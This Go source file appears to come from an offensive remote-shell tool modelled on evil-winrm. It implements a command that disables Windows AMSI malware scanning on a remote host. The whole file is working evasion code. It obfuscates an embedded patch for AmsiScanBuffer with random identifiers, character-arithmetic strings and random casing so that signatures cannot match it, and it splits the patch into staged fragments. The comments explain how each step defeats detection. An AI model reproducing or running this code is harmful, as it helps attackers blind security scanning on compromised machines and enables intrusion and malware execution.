package shell

import (
	"context"
	_ "embed"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"time"

	"github.com/sresarehumantoo/wsmancer/internal/output"
)

// bypass4MSITemplate is upstream evil-winrm's Bypass-4MSI payload, decoded from
// the base64 blob in evil-winrm.rb (get_Bypass_4MSI) and kept verbatim so the
// proven patch is unchanged. It reflects out GetProcAddress/GetModuleHandle via
// Microsoft.Win32.UnsafeNativeMethods, builds a VirtualProtect delegate, makes
// AmsiScanBuffer's prologue writable and overwrites 12 bytes with a stub that
// returns a fixed non-scanning result.
//
// It is a *template*: the placeholders are filled in per invocation by
// obfuscateBypass. See that function for why the randomisation is load-bearing
// rather than decoration.
//
// One deliberate divergence from upstream, in the same spirit as donut-loader's
// chunking. Upstream resolves the export with
//
//	$methods[0].Invoke($null, @($moduleHandle, $name))
//
// where $moduleHandle came from GetModuleHandle and is an IntPtr. On Server 2016
// the only GetProcAddress overload on Microsoft.Win32.UnsafeNativeMethods takes a
// HandleRef, so that call dies with "Object of type 'System.IntPtr' cannot be
// converted to type 'System.Runtime.InteropServices.HandleRef'" and the patch
// never happens, verified live against a stock 2016 listener. The template now
// inspects the chosen overload's first parameter and wraps the handle only when
// it is a HandleRef, which works on both shapes rather than trading one broken
// target for another.
//
//go:embed assets/bypass-4msi.ps1.tmpl
var bypass4MSITemplate string

// bypassVarCount is how many >><VARn>>< placeholders the template carries.
// Upstream's has 12; VAR13 belongs to this port's compatibility fix, below.
const bypassVarCount = 13

// bypassStepPause matches upstream's 2s wait between steps. The payload is split
// into ten fragments that are run as separate commands, and the pause is part of
// the shape upstream ships; keeping it means this port behaves like the tool
// operators already know.
const bypassStepPause = 2 * time.Second

// jumpMarker separates the fragments. Each runs as its own command, with the
// runspace carrying the variables between them, which is also why no single
// command ever contains the whole patch.
const jumpMarker = "#jump"

// bypass4MSI implements `bypass-4msi`. It is the most detection-prone thing this
// port does, and it is deliberately the last feature added: everything else here
// works without it.
func (sh *Shell) bypass4MSI(ctx context.Context, sigs <-chan os.Signal) error {
	if sh.amsiPatched {
		if !sh.json {
			fmt.Fprintf(sh.out, "%s AMSI is already patched in this runspace\n", sh.c.Blue("Info:"))
		}
		return nil
	}

	script := obfuscateBypass(bypass4MSITemplate, rand.New(rand.NewSource(time.Now().UnixNano())))
	steps := strings.Split(script, jumpMarker)

	if !sh.json {
		fmt.Fprintf(sh.out, "%s patching AMSI in %d steps (~%s)...\n",
			sh.c.Blue("Info:"), len(steps), (time.Duration(len(steps)-1) * bypassStepPause).Round(time.Second))
	}

	for i, step := range steps {
		if strings.TrimSpace(step) == "" {
			continue
		}
		res, err := sh.s.RunRaw(ctx, step)
		if err != nil {
			return fmt.Errorf("step %d/%d: %w", i+1, len(steps), err)
		}
		// A PowerShell failure arrives as an error record, not a Go error. The
		// patch is all-or-nothing, so a failed step means the runspace is left
		// half-way through and saying "success" would be a lie.
		if len(res.Errors) > 0 {
			return fmt.Errorf("step %d/%d: %s", i+1, len(steps),
				sanitizeTerminal(output.Text(res.Errors[0])))
		}
		// Any output at all is a problem: every step of a working patch is
		// silent. This mirrors upstream, which treats output as the error report.
		for _, v := range res.Output {
			if s := strings.TrimSpace(output.Text(v)); s != "" {
				return fmt.Errorf("step %d/%d: %s", i+1, len(steps), sanitizeTerminal(s))
			}
		}
		if i == len(steps)-1 {
			break // nothing left to wait for
		}
		// Ctrl-C is honoured between steps, the same lesson sendB64Var learned:
		// an operator interrupting a slow multi-step payload must not have the
		// signal silently buffered for the next command to consume.
		select {
		case <-sigs:
			if !sh.json {
				fmt.Fprintln(sh.out, sh.c.Yellow("^C (canceled part-way; AMSI is NOT patched)"))
			}
			return errPayloadCancelled
		case <-time.After(bypassStepPause):
		}
	}

	sh.amsiPatched = true
	sh.log.Event("[bypass-4msi] AmsiScanBuffer patched")
	if !sh.json {
		fmt.Fprintf(sh.out, "%s AMSI patched in this runspace\n", sh.c.Blue("Info:"))
	}
	return nil
}

// obfuscateBypass fills in the template the way upstream does, and the
// randomisation is functional rather than cosmetic: AMSI scans the script that
// patches AMSI, so a payload carrying the literal strings "amsi.dll" and
// "AmsiScanBuffer" is flagged before it can run. Splitting them into character
// arithmetic is what gets the patch past the thing it is patching, and randomising
// per invocation is what stops a signature matching the payload itself.
//
// Four transformations, in upstream's order: function names, variable names, the
// marked string literals, then keyword casing.
func obfuscateBypass(tmpl string, r *rand.Rand) string {
	// Function and variable names. The trailing ">><" in each placeholder is what
	// keeps VAR1 from also matching inside VAR12.
	for i := 1; i <= 2; i++ {
		tmpl = strings.ReplaceAll(tmpl, fmt.Sprintf(">><FUNCTION%d>><", i), "Get-"+randomIdent(r, 7, 17))
	}
	for i := 1; i <= bypassVarCount; i++ {
		tmpl = strings.ReplaceAll(tmpl, fmt.Sprintf(">><VAR%d>><", i), "$"+randomIdent(r, 7, 17))
	}
	tmpl = replaceMarkedStrings(tmpl, r)
	return randomiseKeywordCase(tmpl, r)
}

// replaceMarkedStrings rewrites every `<><text<><` region as character
// arithmetic, so the literal never appears in the script.
func replaceMarkedStrings(tmpl string, r *rand.Rand) string {
	const mark = "<><"
	var b strings.Builder
	for {
		start := strings.Index(tmpl, mark)
		if start < 0 {
			break
		}
		rest := tmpl[start+len(mark):]
		end := strings.Index(rest, mark)
		if end < 0 {
			break // an unpaired marker: leave the tail alone rather than mangle it
		}
		b.WriteString(tmpl[:start])
		b.WriteString(charExpression(rest[:end], r))
		tmpl = rest[end+len(mark):]
	}
	b.WriteString(tmpl)
	return b.String()
}

// charExpression renders s as a sum of per-character expressions. Upstream joins
// "|"-separated words with a literal "|" between them; none of the payload's
// markers contain one, but the behavior is kept so the template stays
// interchangeable with upstream's.
func charExpression(s string, r *rand.Rand) string {
	parts := make([]string, 0, 2)
	for _, word := range strings.Split(s, "|") {
		var chars []string
		for _, c := range []byte(word) {
			chars = append(chars, oneCharExpression(c, r))
		}
		if len(chars) == 0 {
			chars = append(chars, `""`)
		}
		parts = append(parts, strings.Join(chars, "+"))
	}
	return strings.Join(parts, `+"|"+`)
}

// oneCharExpression encodes a single byte as a subtraction, so the character
// never appears literally. Upstream picks the decimal form about three times in
// four and a hex/byte form otherwise.
func oneCharExpression(c byte, r *rand.Rand) string {
	if r.Intn(4) == 0 {
		// [char]([byte] 0xVAL-0xOFF). The offset is bounded so VAL stays inside a
		// byte; the payload's markers are all ASCII, but a template that ever
		// carried a high byte would otherwise emit something that will not parse.
		off := 30 + r.Intn(91) // 30..120, as upstream
		if int(c)+off <= 0xFF {
			return fmt.Sprintf("[%s]([%s] 0x%x-0x%x)", randomCase("char", r), randomCase("byte", r),
				int(c)+off, off)
		}
	}
	off := r.Intn(10000) + r.Intn(100)
	return fmt.Sprintf("[%s](%d-%d)", randomCase("char", r), int(c)+off, off)
}

// bypassCaseWords is upstream's $WORDS_RANDOM_CASE, restricted to the entries
// that can occur in this payload. PowerShell is case-insensitive, so varying the
// casing changes nothing but the bytes a signature would match on.
var bypassCaseWords = []string{
	"System.Runtime.InteropServices.Marshal",
	"System.Reflection.Emit.AssemblyBuilderAccess",
	"System.Reflection.CallingConventions",
	"System.Reflection.AssemblyName",
	"System.MulticastDelegate",
	"GetDelegateForFunctionPointer",
	".MakeByRefType",
	".CreateType",
	".DefineConstructor",
	".DefineMethod",
	".DefineDynamicModule",
	"function ",
	"ForEach-Object",
	"Where-Object",
	"-and",
	"-like",
}

func randomiseKeywordCase(s string, r *rand.Rand) string {
	for _, w := range bypassCaseWords {
		if strings.Contains(s, w) {
			s = strings.ReplaceAll(s, w, randomCase(w, r))
		}
	}
	return s
}

// randomCase upper-cases roughly half the letters.
func randomCase(w string, r *rand.Rand) string {
	b := []byte(w)
	for i, c := range b {
		if c >= 'a' && c <= 'z' && r.Intn(2) == 0 {
			b[i] = c - 32
		}
	}
	return string(b)
}

const identAlphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

// randomIdent builds an identifier of a random length in [minLen, maxLen].
func randomIdent(r *rand.Rand, minLen, maxLen int) string {
	n := minLen + r.Intn(maxLen-minLen+1)
	b := make([]byte, n)
	for i := range b {
		b[i] = identAlphabet[r.Intn(len(identAlphabet))]
	}
	return string(b)
}
